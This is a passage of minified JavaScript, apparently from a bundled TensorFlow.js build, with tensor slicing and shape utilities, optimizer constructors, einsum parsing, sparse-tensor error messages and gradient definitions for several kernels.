        if (null == s ? (l = new Array(t.length),
        l.fill(1)) : l = s,
        null != i && i & i - 1)
            throw new Error("Multiple ellipses in slice is not allowed.");
        let u = !1;
        const d = {
            dims: l.length,
            numAddAxisAfterEllipsis: 0,
            begin: t.slice(),
            end: e.slice(),
            strides: l.slice(),
            beginMask: o,
            endMask: r,
            ellipsisMask: i,
            newAxisMask: a,
            shrinkAxisMask: c
        };
        for (let I = 0; I < d.dims; I++)
            u && 1 << I & a && d.numAddAxisAfterEllipsis++,
            1 << I & i && (u = !0);
        u || (d.ellipsisMask |= 1 << d.dims,
        d.dims++);
        const h = {
            dims: n.length,
            beginMask: 0,
            endMask: 0,
            beginValid: !1,
            endValid: !1
        };
        !function TT(n, t) {
            t.beginMask = 0,
            t.endMask = 0,
            t.shrinkAxisMask = 0;
            let e = 0;
            t.beginValid = null != n.begin,
            t.endValid = null != n.end,
            t.begin = new Array(t.dims),
            t.end = new Array(t.dims),
            t.strides = new Array(t.dims),
            t.finalShapeGatherIndices = [],
            t.finalShapeGatherIndicesSparse = [],
            t.inputShapeGatherIndicesSparse = new Array(t.dims);
            for (let s = 0; s < n.dims; s++)
                if (1 << s & n.ellipsisMask) {
                    const o = Math.min(t.dims - (n.dims - s) + 1 + n.numAddAxisAfterEllipsis, t.dims);
                    for (; e < o; e++)
                        t.begin[e] = 0,
                        t.end[e] = 0,
                        t.strides[e] = 1,
                        t.beginMask |= 1 << e,
                        t.endMask |= 1 << e,
                        t.finalShapeGatherIndices.push(e),
                        t.finalShapeGatherIndicesSparse.push(-1),
                        t.inputShapeGatherIndicesSparse[e] = s
                } else if (1 << s & n.newAxisMask)
                    t.finalShapeGatherIndices.push(jd),
                    t.finalShapeGatherIndicesSparse.push(-1);
                else {
                    if (e === t.begin.length)
                        throw Error(`Index out of range using input dim ${e}; input has only ${t.dims} dims, ${t.begin.length}.`);
                    null != n.begin && (t.begin[e] = n.begin[s]),
                    null != n.end && (t.end[e] = n.end[s]),
                    t.strides[e] = n.strides[s],
                    n.beginMask & 1 << s && (t.beginMask |= 1 << e),
                    n.endMask & 1 << s && (t.endMask |= 1 << e),
                    n.shrinkAxisMask & 1 << s ? (t.finalShapeGatherIndices.push(vT),
                    t.finalShapeGatherIndicesSparse.push(-1),
                    t.shrinkAxisMask |= 1 << e) : (t.finalShapeGatherIndices.push(e),
                    t.finalShapeGatherIndicesSparse.push(s)),
                    t.inputShapeGatherIndicesSparse[e] = s,
                    e++
                }
        }(d, h);
        let p = !0
          , f = !0
          , m = !0;
        const g = []
          , b = [];
        for (let I = 0; I < n.length; ++I) {
            if (0 === h.strides[I])
                throw Error(`strides[${I}] must be non-zero`);
            const y = !!(h.shrinkAxisMask & 1 << I)
              , w = n[I];
            if (-1 === w) {
                g.push(y ? 1 : -1);
                continue
            }
            const C = [h.beginMask & 1 << I, h.endMask & 1 << I]
              , k = [h.strides[I] > 0 ? 0 : -1, h.strides[I] > 0 ? w : w - 1];
            if (y && h.strides[I] <= 0)
                throw Error("only stride 1 allowed on non-range indexing.");
            m = m && 1 === h.strides[I];
            const S = !!(h.beginMask & 1 << I && h.endMask & 1 << I);
            if (h.beginValid && h.endValid) {
                if (y) {
                    const V = h.begin[I] < 0 ? w + h.begin[I] : h.begin[I];
                    if (h.begin[I] = V,
                    h.end[I] = h.begin[I] + 1,
                    V < 0 || V >= w)
                        throw Error(`slice index ${h.begin[I]} of dimension ${I} out of bounds.`)
                } else
                    h.begin[I] = kg(h.begin[I], 0, h.strides[I], w, C, k),
                    h.end[I] = kg(h.end[I], 1, h.strides[I], w, C, k);
                const L = 1 === h.strides[I] && 0 === h.begin[I] && h.end[I] === w;
                p = p && L,
                f = f && (0 === I && 1 === h.strides[I] || L)
            } else
                p = p && 1 === h.strides[I] && S,
                f = f && (0 === I && 1 === h.strides[I] || S);
            let T, R = !1;
            if (h.beginValid && h.endValid ? (T = h.end[I] - h.begin[I],
            R = !0) : y ? (T = 1,
            R = !0) : S && w >= 0 && (T = h.strides[I] < 0 ? -w : w,
            R = !0),
            R) {
                let L;
                L = 0 === T || T < 0 != h.strides[I] < 0 ? 0 : Math.trunc(T / h.strides[I]) + (T % h.strides[I] != 0 ? 1 : 0),
                g.push(L)
            } else
                g.push(-1)
        }
        for (let I = 0; I < h.finalShapeGatherIndices.length; ++I) {
            const y = h.finalShapeGatherIndices[I];
            y >= 0 ? b.push(g[y]) : y === jd && b.push(1)
        }
        return {
            finalShapeSparse: b.filter(((I,y)=>h.finalShapeGatherIndices[y] !== jd)),
            finalShape: b,
            isIdentity: p,
            sliceDim0: f,
            isSimpleSlice: m,
            begin: h.begin,
            end: h.end,
            strides: h.strides
        }
    }
    function kg(n, t, e, s, o, r) {
        if (o[t])
            return e > 0 ? r[t] : r[t + 1 & 1];
        {
            const i = n < 0 ? s + n : n;
            return i < r[0] ? r[0] : i > r[1] ? r[1] : i
        }
    }
    const NT = Object.freeze(Object.defineProperty({
        __proto__: null,
        assertParamsValid: qd,
        computeFlatOffset: nh,
        computeOutShape: th,
        getNormalizedAxes: function kT(n, t, e, s, o, r, i, a, c) {
            const l = n.length;
            let u = new Array(l)
              , d = new Array(l)
              , h = new Array(l);
            if (t.length && e > 0) {
                const p = t[0]
                  , f = e + 1;
                u = Ig(i, p, f, s, n),
                d = wg(a, p, f, o, n),
                h = bg(r, p, f, n)
            } else
                for (let p = 0; p < l; p++)
                    u[p] = vg(i, s, r, n, p, c),
                    d[p] = Sg(a, o, r, n, p, c),
                    h[p] = Cg(r, p, c);
            return {
                begin: u,
                end: d,
                strides: h
            }
        },
        isSliceContinous: eh,
        maskToAxes: function ST(n) {
            const t = [];
            let e = 0;
            for (; n > 0; )
                1 & n && t.push(e),
                n /= 2,
                e++;
            return t
        },
        parseSliceParams: zc,
        sliceInfo: sh,
        startForAxis: vg,
        startIndicesWithElidedDims: Ig,
        stopForAxis: Sg,
        stopIndicesWithElidedDims: wg,
        stridesForAxis: Cg,
        stridesWithElidedDims: bg
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    const tr = class RT {
        static sgd(t) {
            return new Qd(t)
        }
        static momentum(t, e, s=!1) {
            return new mg(t,e,s)
        }
        static rmsprop(t, e=.9, s=0, o=null, r=!1) {
            return new gg(t,e,s,o,r)
        }
        static adam(t=.001, e=.9, s=.999, o=null) {
            return new pg(t,e,s,o)
        }
        static adadelta(t=.001, e=.95, s=null) {
            return new dg(t,e,s)
        }
        static adamax(t=.002, e=.9, s=.999, o=null, r=0) {
            return new fg(t,e,s,o,r)
        }
        static adagrad(t, e=.1) {
            return new hg(t,e)
        }
    }
      , $T = typeof requestAnimationFrame < "u" ? requestAnimationFrame : typeof setImmediate < "u" ? setImmediate : n=>n();
    function Xc() {
        return new Promise((n=>$T((()=>n()))))
    }
    function oh(n, t) {
        const e = n[0].length;
        n.forEach(((o,r)=>{
            v(o.length === e, (()=>`Error in concat${e}D: rank of tensors[${r}] must be the same as the rank of the rest (${e})`))
        }
        )),
        v(t >= 0 && t < e, (()=>`Error in concat${e}D: axis must be between 0 and ${e - 1}.`));
        const s = n[0];
        n.forEach(((o,r)=>{
            for (let i = 0; i < e; i++)
                v(i === t || o[i] === s[i], (()=>`Error in concat${e}D: Shape of tensors[${r}] (${o}) does not match the shape of the rest (${s}) along the non-concatenated axis ${r}.`))
        }
        ))
    }
    function Kn(n, t) {
        const e = n[0].slice();
        for (let s = 1; s < n.length; s++)
            e[t] += n[s][t];
        return e
    }
    var Rn;
    function Tg(n, t, e) {
        let s = new Array;
        if (null == e && null == t)
            return s;
        if (null == t)
            for (; s.length < n + e.length; )
                s.push(-1);
        else
            s = t.slice();
        if (null == e)
            return s;
        if (n + e.length !== s.length)
            throw new Error(`rt input.shape and shape=${t} are incompatible: rt input.rank = ${n + e.length}, but shape.rank = ${s.length}`);
        for (let o = 1; o < e.length; ++o) {
            const r = e[o]
              , i = s[s.length - e.length + o]
              , a = s[i];
            if (r >= 0)
                if (a >= 0) {
                    if (a !== r)
                        throw new Error(`rt input.shape and shape=${t} are incompatible: rt input.shape[${o + n}] = ${r} but shape[${o + n}] = ${a}`)
                } else
                    s[i] = r
        }
        return s
    }
    function Ng(n) {
        const t = {
            FIRST_DIM_SIZE: Rn.FIRST_DIM_SIZE,
            VALUE_ROWIDS: Rn.VALUE_ROWIDS,
            ROW_LENGTHS: Rn.ROW_LENGTHS,
            ROW_SPLITS: Rn.ROW_SPLITS,
            ROW_LIMITS: Rn.ROW_LIMITS,
            ROW_STARTS: Rn.ROW_STARTS
        }
          , e = [];
        for (const s of n) {
            if (!(s in t))
                break;
            e.push(t[s])
        }
        return e
    }
    function Rg(n) {
        return 0 === n.length ? 0 : n[0] === Rn.FIRST_DIM_SIZE ? n.length - 1 : n.length
    }
    function $g(n, t) {
        if (null == n || null == t)
            return;
        const e = n.length
          , s = t.length;
        if (e >= s)
            throw new Error(`defaultValue.shape=${n} and ragged tensor flatValues.shape=${t}, are incompatible: defaultValue.rank = ${e} must be less than ragged tensor input flatValues.rank = ${s})`);
        for (let o = 0; o < Math.min(e, s - 1); ++o) {
            const r = n[o]
              , i = t[o + 1];
            if (r >= 0 && i >= 0 && 1 !== r && r !== i)
                throw new Error(`defaultValue.shape=${n}, and ragged tensor input flatValues.shape=${t} are incompatible: defaultValue.shape[${o - n.length}] = ${r} but ragged tensor input.flatValues.shape[${o - n.length}] = ${i}`)
        }
    }
    !function(n) {
        n[n.FIRST_DIM_SIZE = 0] = "FIRST_DIM_SIZE",
        n[n.VALUE_ROWIDS = 1] = "VALUE_ROWIDS",
        n[n.ROW_LENGTHS = 2] = "ROW_LENGTHS",
        n[n.ROW_SPLITS = 3] = "ROW_SPLITS",
        n[n.ROW_LIMITS = 4] = "ROW_LIMITS",
        n[n.ROW_STARTS = 5] = "ROW_STARTS"
    }(Rn || (Rn = {}));
    const rh = 30;
    function Ac(n) {
        return n <= rh ? n : Jl(n, Math.floor(Math.sqrt(n)))
    }
    function ih(n, t, e) {
        return [e * ("number" == typeof n ? n : n[0]), t * ("number" == typeof n ? n : n[1])]
    }
    function Mi(n, t, e, s=!0) {
        let o = [];
        if (s)
            o = o.concat(t.slice(0)),
            o.push(n[0] / e),
            o = o.concat(n.slice(1));
        else {
            o = o.concat(n[0]);
            const r = t.length;
            for (let i = 0; i < r; ++i)
                o = o.concat([n[i + 1] / t[i], t[i]]);
            o = o.concat(n.slice(r + 1))
        }
        return o
    }
    function Vi(n, t, e=!0) {
        const s = [];
        if (e) {
            s.push(t);
            for (let o = t + 1; o < n; ++o)
                o <= 2 * t ? (s.push(o),
                s.push(o - (t + 1))) : s.push(o)
        } else {
            const o = []
              , r = [];
            for (let i = 1; i < n; ++i)
                i >= 2 * t + 1 || i % 2 == 1 ? r.push(i) : o.push(i);
            s.push(...o),
            s.push(0),
            s.push(...r)
        }
        return s
    }
    function Fi(n, t, e, s=!0) {
        const o = [];
        s ? o.push(n[0] / e) : o.push(n[0] * e);
        for (let r = 1; r < n.length; ++r)
            r <= t.length ? s ? o.push(t[r - 1] * n[r]) : o.push(n[r] / t[r - 1]) : o.push(n[r]);
        return o
    }
    function ah(n, t) {
        const e = [0];
        for (let s = 0; s < t; ++s)
            e.push(n[s][0]);
        return e
    }
    function ch(n, t, e) {
        const s = n.slice(0, 1);
        for (let o = 0; o < e; ++o)
            s.push(n[o + 1] - t[o][0] - t[o][1]);
        return s
    }
    const Pc = 1.7580993408473768
      , Oc = 1.0507009873554805
      , lh = .3275911
      , uh = .254829592
      , dh = -.284496736
      , hh = 1.421413741
      , ph = -1.453152027
      , fh = 1.061405429;
    function as(n, t) {
        if (n.length !== t.length)
            throw new Error(`Cannot merge real and imag arrays of different lengths. real:${n.length}, imag: ${t.length}.`);
        const e = new Float32Array(2 * n.length);
        for (let s = 0; s < e.length; s += 2)
            e[s] = n[s / 2],
            e[s + 1] = t[s / 2];
        return e
    }
    function Gg(n) {
        const t = new Float32Array(n.length / 2)
          , e = new Float32Array(n.length / 2);
        for (let s = 0; s < n.length; s += 2)
            t[s / 2] = n[s],
            e[s / 2] = n[s + 1];
        return {
            real: t,
            imag: e
        }
    }
    function Lg(n) {
        const t = Math.ceil(n.length / 4)
          , e = new Float32Array(t)
          , s = new Float32Array(t);
        for (let o = 0; o < n.length; o += 4)
            e[Math.floor(o / 4)] = n[o],
            s[Math.floor(o / 4)] = n[o + 1];
        return {
            real: e,
            imag: s
        }
    }
    function Eg(n) {
        const t = Math.floor(n.length / 4)
          , e = new Float32Array(t)
          , s = new Float32Array(t);
        for (let o = 2; o < n.length; o += 4)
            e[Math.floor(o / 4)] = n[o],
            s[Math.floor(o / 4)] = n[o + 1];
        return {
            real: e,
            imag: s
        }
    }
    function mh(n, t) {
        return {
            real: n[2 * t],
            imag: n[2 * t + 1]
        }
    }
    function Dg(n, t, e, s) {
        n[2 * s] = t,
        n[2 * s + 1] = e
    }
    function Wg(n, t) {
        const e = new Float32Array(n / 2)
          , s = new Float32Array(n / 2);
        for (let o = 0; o < Math.ceil(n / 2); o++) {
            const r = (t ? 2 : -2) * Math.PI * (o / n);
            e[o] = Math.cos(r),
            s[o] = Math.sin(r)
        }
        return {
            real: e,
            imag: s
        }
    }
    function Mg(n, t, e) {
        const s = (e ? 2 : -2) * Math.PI * (n / t);
        return {
            real: Math.cos(s),
            imag: Math.sin(s)
        }
    }
    const gh = "->"
      , GT = /->/g
      , Vg = ","
      , Fg = "...";
    function bh(n, t) {
        const e = ((n = n.replace(/\s/g, "")).length - n.replace(GT, "").length) / gh.length;
        if (e < 1)
            throw new Error("Equations without an arrow are not supported.");
        if (e > 1)
            throw new Error(`Equation must contain exactly one arrow ("${gh}").`);
        const [s,o] = n.split(gh);
        v(-1 === s.indexOf(Fg), (()=>`The ellipsis notation ("${Fg}") is not supported yet.`));
        const r = s.split(Vg)
          , i = r.length;
        if (t !== i)
            throw new Error(`Expected ${i} input tensors, received ${t}`);
        if (i > 2)
            throw new Error("Support for more than 2 input tensors is not implemented yet.");
        const a = [];
        for (let h = 0; h < o.length; ++h) {
            const p = o[h];
            if (!r.some((f=>-1 !== f.indexOf(p))))
                throw new Error(`Output subscripts contain the label ${p} not present in the input subscripts.`);
            -1 === a.indexOf(p) && a.push(p)
        }
        for (let h = 0; h < s.length; ++h) {
            const p = s[h];
            -1 === a.indexOf(p) && p !== Vg && a.push(p)
        }
        const c = new Array(r.length);
        for (let h = 0; h < i; ++h) {
            if (new Set(r[h].split("")).size !== r[h].length)
                throw new Error(`Found duplicate axes in input component ${r[h]}. Support for duplicate axes in input is not implemented yet.`);
            c[h] = [];
            for (let p = 0; p < r[h].length; ++p)
                c[h].push(a.indexOf(r[h][p]))
        }
        const l = a.length
          , d = [];
        for (let h = o.length; h < l; ++h)
            d.push(h);
        return {
            allDims: a,
            summedDims: d,
            idDims: c
        }
    }
    function xh(n, t) {
        let e = new Array(n);
        e.fill(-1);
        for (let o = 0; o < t.length; ++o)
            e[t[o]] = o;
        const s = [];
        for (let o = 0; o < n; ++o)
            -1 === e[o] && s.push(o);
        return e = e.filter((o=>-1 !== o)),
        {
            permutationIndices: e,
            expandDims: s
        }
    }
    function yh(n, t, e) {
        const s = new Array(n);
        for (let o = 0; o < e.length; ++o) {
            const r = e[o].shape;
            for (let i = 0; i < t[o].length; ++i)
                void 0 === s[t[o][i]] ? s[t[o][i]] = r[i] : v(s[t[o][i]] === r[i], (()=>`Expected dimension ${s[t[o][i]]} at axis ${i} of input shaped ${JSON.stringify(r)}, but got dimension ${r[i]}`))
        }
    }
    function Ih(n, t) {
        const e = n
          , s = [];
        let o = 0;
        0 === n.length && e.push(-1),
        o = n.length + 1;
        for (let i = 0; i < o; ++i)
            s.push([]);
        const r = [];
        for (let i = 0; i < e.length; ++i) {
            const c = LT(t, e[i]);
            for (const l of c)
                -1 === r.indexOf(l) && (s[i].push(l),
                r.push(l))
        }
        return {
            path: e,
            steps: s
        }
    }
    function wh(n) {
        return n.every(((t,e)=>t === e))
    }
    function LT(n, t) {
        const e = [];
        for (let s = 0; s < n.length; ++s)
            (0 === n[s].length || -1 !== n[s].indexOf(t) || -1 === t) && e.push(s);
        return e
    }
    function Ch(n, t, e=0) {
        let s = [];
        if ("number" == typeof t)
            v(n.shape[e] % t == 0, (()=>"Number of splits must evenly divide the axis.")),
            s = new Array(t).fill(n.shape[e] / t);
        else {
            v(t.reduce(((i,a)=>(-1 === a && (i += 1),
            i)), 0) <= 1, (()=>"There should be only one negative value in split array."));
            const r = t.indexOf(-1);
            if (-1 !== r) {
                const i = t.reduce(((a,c)=>c > 0 ? a + c : a));
                t[r] = n.shape[e] - i
            }
            v(n.shape[e] === t.reduce(((i,a)=>i + a)), (()=>"The sum of sizes must match the size of the axis dimension.")),
            s = t
        }
        return s
    }
    function zg(n) {
        return `Received SparseTensor with denseShape[0] = 0 but\n  indices.shape[0] = ${n}`
    }
    function Xg(n, t) {
        return `indices(${n}, 0) is invalid: ${t} < 0`
    }
    function Ag(n, t, e) {
        return `indices(${n}, 0) is invalid: ${t} >= ${e}`
    }
    function Pg(n, t) {
        return `only one output dimension may be -1, not both ${n} and ${t}`
    }
    function Og(n, t) {
        return `size ${n} must be non-negative, not ${t}`
    }
    function Kg() {
        return "reshape cannot infer the missing input size for an empty tensor unless all specified input sizes are non-zero"
    }
    function Zg(n, t) {
        return `Input to reshape is a SparseTensor with ${Z(n)}\n  dense values, but the requested shape requires a multiple of ${Z(t)}. inputShape=${n} outputShape= ${t}`
    }
    function Bg(n, t) {
        return `Input to reshape is a tensor with ${Z(n)} dense values, but the requested shape has ${Z(t)}. inputShape=${n} outputShape=${t}`
    }
    function vh() {
        return "segment ids must be >= 0"
    }
    function Hg() {
        return "segment ids are not increasing"
    }
    function _g(n, t) {
        return `Segment id ${n} out of range [0, ${t}), possibly because segmentIds input is not sorted.`
    }
    function Ug(n, t, e) {
        return `Bad: indices[${n}] == ${t} out of range [0, ${e})`
    }
    function Yg(n, t) {
        let s, e = !1;
        for (n <= rh ? (s = n,
        e = !0) : s = Jl(n, Math.floor(Math.sqrt(n))); !e; )
            s > t || s === n ? e = !0 : s = Jl(n, s + 1);
        return s
    }
    function Qg(n, t, e) {
        const s = []
          , o = n.length;
        for (let r = 0; r < o; r++)
            r !== t ? s.push(n[r]) : s.push(e);
        return s
    }
    function Sh(n, t, e, s) {
        const o = t.shape.length
          , r = n.shape.length;
        if (0 !== s && (s < -o || s > o))
            throw new Error(`Expect batchDims in the range of [-${o}, ${o}], but got ${s}`);
        if (s < 0 && (s += o),
        s > r)
            throw new Error(`batchDims (${s}) must be less than rank(x) (\n    ${r}).`);
        if (e < s)
            throw new Error(`batchDims (${s}) must be less than or equal to axis (${e}).`);
        for (let d = 0; d < s; ++d)
            if (n.shape[d] !== t.shape[d])
                throw new Error(`x.shape[${d}]: ${n.shape[d]} should be equal to indices.shape[${d}]: ${t.shape[d]}.`);
        const i = n.shape[e]
          , a = [];
        let c = 1
          , l = 1
          , u = 1;
        for (let d = 0; d < s; ++d)
            a.push(n.shape[d]),
            c *= n.shape[d];
        for (let d = s; d < e; d++)
            a.push(n.shape[d]),
            l *= n.shape[d];
        for (let d = s; d < o; d++)
            a.push(t.shape[d]);
        for (let d = e + 1; d < r; d++)
            a.push(n.shape[d]),
            u *= n.shape[d];
        return {
            batchSize: c,
            sliceSize: u,
            outerSize: l,
            dimSize: i,
            outputShape: a
        }
    }
    const ET = Object.freeze(Object.defineProperty({
        __proto__: null,
        collectGatherOpShapeInfo: Sh,
        computeOutShape: Qg,
        segOpComputeOptimalWindowSize: Yg
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    function cs(n) {
        try {
            return n.map((t=>xs(t)))
        } catch (t) {
            throw new Error(`Failed to decode encoded string bytes into utf-8, error: ${t}`)
        }
    }
    function Jg(n) {
        return n.map((t=>bs(t)))
    }
    const DT = Object.freeze(Object.defineProperty({
        __proto__: null,
        ERF_A1: uh,
        ERF_A2: dh,
        ERF_A3: hh,
        ERF_A4: ph,
        ERF_A5: fh,
        ERF_P: lh,
        PARALLELIZE_THRESHOLD: rh,
        get RowPartitionType() {
            return Rn
        },
        SELU_SCALE: Oc,
        SELU_SCALEALPHA: Pc,
        applyActivation: Zd,
        assertAndGetBroadcastShape: gt,
        assertAxesAreInnerMostDims: Ie,
        assertParamsConsistent: oh,
        assignToTypedArray: Dg,
        axesAreInnerMostDims: yd,
        calculateShapes: co,
        checkEinsumDimSizes: yh,
        checkPadOnDimRoundingMode: ze,
        combineLocations: Fm,
        combineRaggedTensorToTensorShapes: Tg,
        complexWithEvenIndex: Lg,
        complexWithOddIndex: Eg,
        computeConv2DInfo: ye,
        computeConv3DInfo: ws,
        computeDefaultPad: ud,
        computeDilation2DInfo: Si,
        computeOptimalWindowSize: Ac,
        computeOutAndReduceShapes: me,
        computeOutShape: Kn,
        computePool2DInfo: pn,
        computePool3DInfo: ss,
        convertConv2DDataFormat: os,
        decodeEinsumEquation: bh,
        eitherStridesOrDilationsAreOne: Te,
        expandShapeToKeepDim: re,
        exponent: Mg,
        exponents: Wg,
        fromStringArrayToUint8: Jg,
        fromUint8ToStringArray: cs,
        getAxesPermutation: Yt,
        getBroadcastDims: Uo,
        getComplexWithIndex: mh,
        getEinsumComputePath: Ih,
        getEinsumPermutation: xh,
        getFusedBiasGradient: Kd,
        getFusedDyActivation: Od,
        getImageCenter: ih,
        getInnerMostAxes: ee,
        getPermuted: Vi,
        getRaggedRank: Rg,
        getReductionAxes: ce,
        getReshaped: Mi,
        getReshapedPermuted: Fi,
        getRowPartitionTypesHelper: Ng,
        getSliceBeginCoords: ah,
        getSliceSize: ch,
        getSparseFillEmptyRowsIndicesDenseShapeMismatch: zg,
        getSparseFillEmptyRowsNegativeIndexErrorMessage: Xg,
        getSparseFillEmptyRowsOutOfRangeIndexErrorMessage: Ag,
        getSparseReshapeEmptyTensorZeroOutputDimErrorMessage: Kg,
        getSparseReshapeInputOutputMismatchErrorMessage: Bg,
        getSparseReshapeInputOutputMultipleErrorMessage: Zg,
        getSparseReshapeMultipleNegativeOneOutputDimErrorMessage: Pg,
        getSparseReshapeNegativeOutputDimErrorMessage: Og,
        getSparseSegmentReductionIndicesOutOfRangeErrorMessage: Ug,
        getSparseSegmentReductionNegativeSegmentIdsErrorMessage: vh,
        getSparseSegmentReductionNonIncreasingSegmentIdsErrorMessage: Hg,
        getSparseSegmentReductionSegmentIdOutOfRangeErrorMessage: _g,
        getUndoAxesPermutation: Cs,
        isIdentityPermutation: wh,
        log: function fw(...n) {
            z().getBool("IS_TEST") || z().getBool("PROD") || console.log(...n)
        },
        mergeRealAndImagArrays: as,
        prepareAndValidate: Jd,
        prepareSplitSize: Ch,
        segment_util: ET,
        shouldFuse: Bd,
        slice_util: NT,
        splitRealAndImagArrays: Gg,
        stridesOrDilationsArePositive: no,
        tupleValuesAreOne: eo,
        upcastType: _e,
        validateDefaultValueShape: $g,
        validateInput: function ck(n, t, e) {
            if (t.rank < 1)
                throw new Error(`tf.scatterND() expects the indices to be rank 1 or higher, but the rank was ${t.rank}.`);
            if (n.rank < 1)
                throw new Error(`tf.scatterND() expects the updates to be rank 1 or higher, but the rank was ${n.rank}.`);
            if ("int32" !== t.dtype)
                throw new Error(`The dtype of 'indices' should be int32, but got dtype: ${t.dtype}`);
            if (e.length < 1)
                throw new Error(`Output rank must be greater or equal to 1, but got shape: ${e}`);
            if (0 === e.length) {
                if (0 === t.size)
                    throw new Error(`Indices specified for empty output. indices shape: ${t.shape}`);
                if (0 === n.size)
                    throw new Error(`Updates specified for empty output. updates shape: ${n.shape}`)
            }
            ng(e, t, n)
        },
        validateUpdateShape: ng,
        warn: je
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    !function IT() {
        for (const n of yT)
            _(n)
    }();
    const jg = {
        kernelName: ya,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(n, Wi(st(e, "float32"), -1))
            }
        }
    }
      , WT = {
        kernelName: vr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>{
                    const s = Bt(st(e, "float32"))
                      , o = Ee(pt(Gt(1), s));
                    return ne(dt(n, o))
                }
            }
        }
    }
      , MT = {
        kernelName: Sr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>{
                    const s = Ee(pt(Bt(st(e, "float32")), 1));
                    return dt(n, s)
                }
            }
        }
    }
      , VT = {
        kernelName: Fo,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = gt(e.shape, s.shape);
            return {
                a: ()=>{
                    let a = n;
                    const c = ce(e.shape, o);
                    return c.length > 0 && (a = ut(a, c)),
                    W(a, e.shape)
                }
                ,
                b: ()=>{
                    let a = n;
                    const c = ce(s.shape, o);
                    return c.length > 0 && (a = ut(a, c)),
                    W(a, s.shape)
                }
            }
        }
    }
      , FT = {
        kernelName: nu,
        saveAllInputs: !0,
        gradFunc: (n,t)=>{
            const e = {};
            return t.forEach(((s,o)=>{
                e[o] = ()=>n.clone()
            }
            )),
            e
        }
    }
      , zT = {
        kernelName: Ia,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>St(e)
            }
        }
    }
      , XT = {
        kernelName: wa,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>St(e)
            }
        }
    }
      , AT = {
        kernelName: kr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, Ee(pt(Gt(1), Bt(st(e, "float32")))))
            }
        }
    }
      , PT = {
        kernelName: Tr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>{
                    const s = Ee(Q(Gt(1), Bt(st(e, "float32"))));
                    return dt(n, s)
                }
            }
        }
    }
      , OT = {
        kernelName: $r,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = gt(e.shape, s.shape);
            return {
                a: ()=>{
                    const a = Q(Bt(e), Bt(s));
                    let c = E(n, dt(s, a));
                    const l = ce(e.shape, o);
                    return l.length > 0 && (c = ut(c, l)),
                    W(c, e.shape)
                }
                ,
                b: ()=>{
                    const a = Q(Bt(e), Bt(s));
                    let c = ne(E(n, dt(e, a)));
                    const l = ce(s.shape, o);
                    return l.length > 0 && (c = ut(c, l)),
                    W(c, s.shape)
                }
            }
        }
    }
      , KT = {
        kernelName: Nr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, Q(Bt(st(e, "float32")), 1))
            }
        }
    }
      , ZT = {
        kernelName: Rr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, pt(Gt(1), Bt(st(e, "float32"))))
            }
        }
    };
    const HT = D({
        avgPool3dGrad_: function BT(n, t, e, s, o, r) {
            const i = N(n, "dy", "avgPool3dGrad")
              , a = N(t, "input", "avgPool3dGrad");
            let c = i
              , l = a
              , u = !1;
            4 === a.rank && (u = !0,
            c = W(i, [1, i.shape[0], i.shape[1], i.shape[2], i.shape[3]]),
            l = W(a, [1, a.shape[0], a.shape[1], a.shape[2], a.shape[3]])),
            v(5 === c.rank, (()=>`Error in avgPool3dGrad: dy must be rank 5 but got rank ${c.rank}.`)),
            v(5 === l.rank, (()=>`Error in avgPool3dGrad: input must be rank 5 but got rank ${l.rank}.`)),
            ze("avgPool3dGrad", o, r);
            const d = {
                dy: c,
                input: l
            }
              , h = {
                filterSize: e,
                strides: s,
                pad: o,
                dimRoundingMode: r
            }
              , p = G.runKernel(iu, d, h);
            return u ? W(p, [p.shape[1], p.shape[2], p.shape[3], p.shape[4]]) : p
        }
    })
      , _T = {
        kernelName: va,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {filterSize: o, strides: r, pad: i, dimRoundingMode: a} = e;
            return {
                x: ()=>HT(n, s, o, r, i, a)
            }
        }
    };
    const YT = D({
        avgPoolGrad_: function UT(n, t, e, s, o) {
            const r = N(n, "dy", "avgPoolGrad")
              , i = N(t, "input", "avgPoolGrad");
            v(i.rank === r.rank, (()=>`Rank of input (${i.rank}) does not match rank of dy (${r.rank})`));
            let a = i
              , c = r
              , l = !1;
            3 === i.rank && (l = !0,
            a = W(i, [1, i.shape[0], i.shape[1], i.shape[2]]),
            c = W(r, [1, r.shape[0], r.shape[1], r.shape[2]])),
            v(4 === c.rank, (()=>`Error in avgPoolGrad: dy must be rank 4 but got rank ${c.rank}.`)),
            v(4 === a.rank, (()=>`Error in avgPoolGrad: input must be rank 4 but got rank ${a.rank}.`));
            const u = {
                dy: c,
                input: a
            }
              , d = {
                filterSize: e,
                strides: s,
                pad: o
            }
              , h = G.runKernel(ru, u, d);
            return l ? W(h, [h.shape[1], h.shape[2], h.shape[3]]) : h
        }
    })
      , QT = {
        kernelName: Ca,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {filterSize: o, strides: r, pad: i} = e;
            return {
                x: ()=>YT(n, s, o, r, i)
            }
        }
    }
      , JT = {
        kernelName: Sa,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , {transposeA: r, transposeB: i} = e;
            return r || i ? !r && i ? {
                a: ()=>$t(n, o, !1, !1),
                b: ()=>$t(n, s, !0, !1)
            } : r && !i ? {
                a: ()=>$t(o, n, !1, !0),
                b: ()=>$t(s, n, !1, !1)
            } : {
                a: ()=>$t(o, n, !0, !0),
                b: ()=>$t(n, s, !0, !0)
